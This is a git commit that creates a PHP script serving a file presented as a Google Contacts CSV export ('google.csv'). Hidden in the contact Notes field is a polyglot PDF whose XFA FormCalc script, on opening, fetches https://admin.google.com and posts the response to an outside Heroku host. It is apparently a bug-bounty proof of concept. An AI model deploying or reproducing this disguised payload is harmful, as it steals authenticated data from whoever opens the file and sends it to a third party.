42313ddff4d959997238083236a8faefe64ca07e
missoum1307 <missoum1307@users.noreply.github.com>
2018-09-03 18:47:22 +0100

    Create csv.php

---
+++ csv.php
@@ -0,0 +1,14 @@
+<?php
+header('content-type: text/csv; charset=US-ASCII');
+header('content-disposition: attachment; filename="google.csv"');
+header('X-Content-Type-Options: nosniff');
+?>
+
+Name,Given Name,Additional Name,Family Name,Yomi Name,Given Name Yomi,Additional Name Yomi,Family Name Yomi,Name Prefix,Name Suffix,Initials,Nickname,Short Name,Maiden Name,Birthday,Gender,Location,Billing Information,Directory Server,Mileage,Occupation,Hobby,Sensitivity,Priority,Subject,Notes,Group Membership
+,,,,,,,,,,,,,,,,,,,,,,,,,"%PDF-1.
+%PDF-1.
+1 0 obj <<>> stream
+<xdp:xdp xmlns:xdp='http://ns.adobe.com/xdp/'><config><present><pdf><interactive>1</interactive></pdf></present></config> <template><subform name='_'><pageSet/><field id='Hello World!'><event activity='initialize'><script contentType='application/x-formcalc'>var content = GET(""https://admin.google.com"") POST(""https://bughunt1307.herokuapp.com/post.php"",content)</script></event></field></subform></template></xdp:xdp>
+endstream
+endobj trailer <</Root <</AcroForm <</Fields [<</T (0) /Kids [<</Subtype /Widget /Rect [] /T () /FT /Btn>>]>>]/XFA 1 0 R>>/Pages <<>>>>>>
+",* My Contacts
